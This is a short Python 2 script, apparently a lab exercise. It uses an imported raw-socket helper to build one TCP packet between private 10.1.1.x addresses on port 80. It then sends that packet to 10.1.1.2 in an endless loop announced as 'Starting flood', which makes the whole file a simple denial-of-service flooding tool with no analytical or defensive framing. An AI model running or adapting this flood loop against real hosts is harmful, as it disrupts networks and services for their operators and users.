from tcp_ip_raw_socket import *


def main():
	fd = createSocket()
	pkt = buildPacket("10.1.1.2", "10.1.1.1", 54321, 80, "Hello, how are you?")

	try:
		print "Starting flood"
		while True:
			sendPacket(fd, pkt, "10.1.1.2")

	except KeyboardInterrupt:
		print "Closing..."


if __name__ == "__main__":
	main()